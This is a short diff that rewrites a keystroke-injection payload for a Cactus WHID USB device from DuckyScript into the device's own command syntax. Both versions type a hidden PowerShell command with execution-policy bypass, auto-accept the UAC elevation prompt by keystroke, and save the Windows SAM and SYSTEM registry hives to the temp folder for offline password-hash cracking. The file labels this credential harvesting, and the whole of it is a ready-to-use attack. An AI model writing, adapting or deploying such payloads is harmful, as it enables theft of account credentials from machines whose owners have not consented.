@@ -1,12 +1,9 @@
-REM === Cactus WHID Payload: SAM/SYSTEM Registry Hive Backup ===
-REM Target: Windows 10/11 (requires admin UAC accept)
-REM Category: Credential Harvesting
-REM Description: Saves SAM and SYSTEM hives to %TEMP% for offline hash cracking
-REM Note: Files saved at %TEMP%\sam.hiv and %TEMP%\sys.hiv
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C reg save HKLM\SAM $env:TEMP\sam.hiv /y; reg save HKLM\SYSTEM $env:TEMP\sys.hiv /y'"
-ENTER
-DELAY 1000
-ALT y
+Rem: Cactus WHID Payload - SAM/SYSTEM Registry Hive Backup
+Rem: Target - Windows 10/11 (requires admin UAC accept)
+Rem: Saves SAM and SYSTEM hives to TEMP for offline hash cracking
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C reg save HKLM\SAM $env:TEMP\sam.hiv /y; reg save HKLM\SYSTEM $env:TEMP\sys.hiv /y'"
+CustomDelay:1000
+Press:130+121
